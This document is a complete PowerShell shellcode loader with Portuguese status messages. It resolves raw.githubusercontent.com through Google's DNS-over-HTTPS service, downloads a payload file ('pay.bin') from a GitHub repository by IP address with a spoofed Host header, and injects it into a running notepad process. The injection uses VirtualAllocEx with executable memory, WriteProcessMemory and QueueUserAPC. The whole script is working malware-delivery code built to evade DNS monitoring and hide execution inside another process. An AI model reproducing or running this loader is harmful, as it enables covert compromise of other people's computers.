try {
 
    $targetProcessName = "notepad"

 
    $realDomain = "raw.githubusercontent.com"
    $dohUrl = "https://dns.google/resolve?name=" + $realDomain
    $dohResponse = Invoke-RestMethod -Uri $dohUrl
    $ipAddress = ($dohResponse.Answer | Where-Object { $_.type -eq 1 }).data | Select-Object -First 1
    if (-not $ipAddress) { throw "Não foi possível resolver o IP via DoH." }

    $downloadUri = "https://{0}/anjimdead/binary/main/pay.bin" -f $ipAddress
    $headers = @{ "Host" = $realDomain }
    $response = Invoke-WebRequest -Uri $downloadUri -Headers $headers
    $sc = $response.Content

    $code = @"
    using System;
    using System.Runtime.InteropServices;
    public class K32 {
        [Flags]
        public enum ProcessAccessFlags : uint { All = 0x001F0FFF }
        [Flags]
        public enum ThreadAccessFlags : uint { All = 0x1F03FF }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(ThreadAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
    }
"@
    Add-Type -TypeDefinition $code

  
    $targetProcess = Get-Process -Name $targetProcessName | Select-Object -First 1
    if (-not $targetProcess) { throw "Processo alvo '$targetProcessName.exe' não encontrado. Por favor, abra-o primeiro." }
    $mainThreadId = $targetProcess.Threads[0].Id
    
    Write-Host "Alvo encontrado: $($targetProcess.Name) (PID: $($targetProcess.Id)), Thread Principal: $mainThreadId" -ForegroundColor Cyan


    $hProcess = [K32]::OpenProcess([K32+ProcessAccessFlags]::All, $false, $targetProcess.Id)
    $hThread = [K32]::OpenThread([K32+ThreadAccessFlags]::All, $false, $mainThreadId)
    if ($hProcess -eq [IntPtr]::Zero -or $hThread -eq [IntPtr]::Zero) { throw "Falha ao obter handle para o processo ou thread alvo." }

 
    $addr = [K32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
    $bytesWritten = [IntPtr]::Zero
    [K32]::WriteProcessMemory($hProcess, $addr, $sc, $sc.Length, [ref]$bytesWritten)

    $result = [K32]::QueueUserAPC($addr, $hThread, [IntPtr]::Zero)
    if ($result -eq 0) { throw "Falha ao enfileirar a APC." }

    Write-Host "Payload agendado para execução via APC na thread do processo alvo!" -ForegroundColor Green
    Write-Host "O PowerShell agora pode ser fechado sem problemas."

} catch {
    Write-Host "Ocorreu um erro: $_" -ForegroundColor Red
}
